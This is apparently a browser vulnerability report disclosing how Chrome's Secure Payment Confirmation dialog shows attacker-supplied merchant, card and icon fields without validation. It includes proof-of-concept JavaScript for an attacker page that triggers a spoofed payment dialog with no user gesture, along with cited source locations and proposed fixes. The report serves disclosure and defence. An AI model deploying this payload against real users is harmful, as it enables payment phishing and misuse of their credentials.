# Chrome VRP Report: Secure Payment Confirmation Complete UI Spoofing via Unvalidated Dialog Fields

## Summary

Chrome's Secure Payment Confirmation (SPC) browser-chrome payment dialog displays EVERY user-visible field from attacker-controlled input without validation: `payeeOrigin`, `payeeName`, `instrument.displayName`, and `instrument.icon`. Combined with the fact that SPC assertion intentionally skips RP ID validation (allowing any origin to assert credentials for any RP), an attacker can construct a browser-trusted payment dialog where the user sees a completely spoofed merchant identity, instrument identity, and payment amount — then biometrically authenticates a real WebAuthn credential.

## Severity Assessment

- **Type**: UI Spoofing / Phishing in Browser-Trusted Chrome
- **User Interaction**: User must biometrically confirm (fingerprint/face). NO user gesture required to show the dialog (activationless show allowed once per page load).
- **Preconditions**: User has an SPC credential registered (e.g., from a previous transaction); attacker knows or can guess the credential ID
- **Chrome Version**: All versions supporting SPC
- **Flags Required**: None (default configuration)
- **Compromised Renderer**: Not required
- **Platform**: All desktop and Android platforms with SPC support

## Reproduction Steps

### 1. Setup: Victim registers SPC credential with their bank

The victim visits their bank (`bank.com`) and registers an SPC credential:
```javascript
// At bank.com — normal SPC credential registration
const credential = await navigator.credentials.create({
  publicKey: {
    rp: { id: "bank.com", name: "My Bank" },
    user: { id: userId, name: "user@email.com", displayName: "User" },
    challenge: serverChallenge,
    pubKeyCredParams: [{type: "public-key", alg: -7}],
    extensions: { payment: { isPayment: true } }
  }
});
// Bank stores credential.id
```

### 2. Attack: Attacker invokes SPC immediately on page load (NO user gesture needed)

```javascript
// At evil-merchant.com — executes immediately on page load
// PaymentRequest.show() allows ONE activationless call per page load
// (payment_request.cc:309-332, payment_request_web_contents_manager.cc:32-34)
const request = new PaymentRequest(
  [{
    supportedMethods: "secure-payment-confirmation",
    data: {
      credentialIds: [knownCredentialId],  // Attacker knows victim's credential ID
      challenge: new Uint8Array(32),       // Attacker's challenge
      rpId: "bank.com",                    // Any RP — no validation for assertions!
      instrument: {
        displayName: "Visa •••• 1234",     // Spoofed — shows in dialog
        icon: "https://evil.com/visa.png", // Spoofed — shows in dialog
      },
      payeeOrigin: "https://amazon.com",   // Spoofed — shows in dialog
      payeeName: "Amazon.com",             // Spoofed — shows in dialog
      timeout: 60000,
    }
  }],
  { total: { label: "Total", amount: { currency: "USD", value: "29.99" } } }
);

const response = await request.show();
// If user confirms: attacker gets valid WebAuthn assertion for bank.com
const assertionResponse = response.details;
// assertionResponse.response contains authenticatorData + signature
```

### 3. What the user sees in Chrome's trusted dialog:

```
╔══════════════════════════════════════════╗
║  Verify your payment                     ║
║                                          ║
║  [Visa Logo]  Visa •••• 1234            ║ ← attacker-controlled
║                                          ║
║  Store:  amazon.com                      ║ ← attacker-controlled
║  Amount: $29.99                          ║ ← attacker-controlled
║                                          ║
║  Payment to Amazon.com                   ║ ← attacker-controlled
║                                          ║
║  [Use fingerprint to confirm]            ║
╚══════════════════════════════════════════╝
```

The dialog looks IDENTICAL to a legitimate Amazon payment. It's rendered in browser chrome (not in web content), so users have every reason to trust it.

### 4. Result

- Attacker receives a valid WebAuthn assertion signed by the user's authenticator
- The assertion's `clientDataJSON` contains `origin: "https://evil-merchant.com"` and `topOrigin: "https://evil-merchant.com"`
- A properly-implemented bank server would reject this, but:
  - The user has already leaked their biometric
  - The assertion is cryptographically valid for `bank.com`'s RP ID
  - Not all SPC implementations correctly validate the origin field
  - A relay attack could modify the origin before forwarding

## Technical Root Cause

### 1. RP ID validation intentionally bypassed for SPC assertions

`content/browser/webauth/webauth_request_security_checker.cc:174-181`:
```cpp
if (request_type == RequestType::kGetPaymentCredentialAssertion) {
  std::move(callback).Run(blink::mojom::AuthenticatorStatus::SUCCESS);
  return nullptr;  // Skips ALL RP ID validation
}
```

### 2. payeeOrigin/payeeName not validated against caller

`chrome/browser/payments/secure_payment_confirmation_helper.cc:136-144` (or equivalent):
- `payeeOrigin` is taken directly from the JS request
- No check that it matches the calling page's origin or has any relationship to the transaction

### 3. instrument.displayName/icon not validated against credential

`components/payments/content/secure_payment_confirmation_controller.cc:286-300`:
```cpp
model->set_instrument_label(request->instrument_label());
model->set_instrument_icon(request->instrument_icon());
```
- The display name and icon come from the calling page, not from the credential or the RP
- No mechanism exists to retrieve the "real" instrument name associated with a credential

### 4. No user gesture required to show the dialog

`components/payments/content/payment_request.cc:309-332`:
```cpp
if (!had_user_activation) {
  if (manager->HadActivationlessShow()) {
    // Reject — only one activationless show per page
  } else {
    // Allow activationless show!
    is_activationless_show_ = true;
    manager->RecordActivationlessShow();
  }
}
```

One SPC dialog per page load can be shown without ANY user gesture. The attacker page can present the spoofed dialog the instant the user navigates to it.

### 5. Icon downloaded from attacker-controlled URL

`components/payments/content/secure_payment_confirmation_app_factory.cc:387-392`:
- The icon URL is provided by the attacker
- Chrome downloads and displays it in the trusted dialog
- Only validation: must be HTTPS and non-empty

## Impact

1. **Complete browser-chrome phishing**: The SPC dialog is rendered in browser chrome (not web content), making it inherently more trusted than a web page. Users cannot distinguish a spoofed SPC dialog from a legitimate one.

2. **Cross-site credential assertion**: Any website can trigger assertion for any credential, regardless of origin relationship.

3. **Biometric data exposure**: Users biometrically authenticate (fingerprint/face) based on a completely false premise.

4. **Scalable attack**: An attacker who knows credential IDs (e.g., a compromised transaction log) can target many users simultaneously.

## Suggested Fixes

### Option 1: Validate payeeOrigin matches calling frame's origin or top-level origin
```cpp
if (request->payee_origin() != calling_origin && 
    request->payee_origin() != top_frame_origin) {
  // Reject or show warning
}
```

### Option 2: Display the ACTUAL caller origin prominently in the dialog
```
"evil-merchant.com is requesting payment verification"
"They claim this is for: Amazon.com"  ← clearly marked as unverified claim
```

### Option 3: Bind instrument display info to the credential at registration time
- During SPC credential creation, associate a verified display name/icon with the credential
- At assertion time, show the registered display info, not the caller's claims

### Option 4: Show a clear security indicator
- Add "[Unverified]" labels next to all attacker-provided fields
- Show the actual calling origin separately from the claimed payee

## References

- SPC Explainer: https://github.com/nicoptere/nicoptere.github.io/blob/master/nicoptere-blog-engine/specs/secure-payment-confirmation/
- WebAuthn Level 3: RP ID is the primary security boundary for assertions
- Finding 228: First report of payeeOrigin/payeeName spoofing (this report adds instrument spoofing + attack chain)
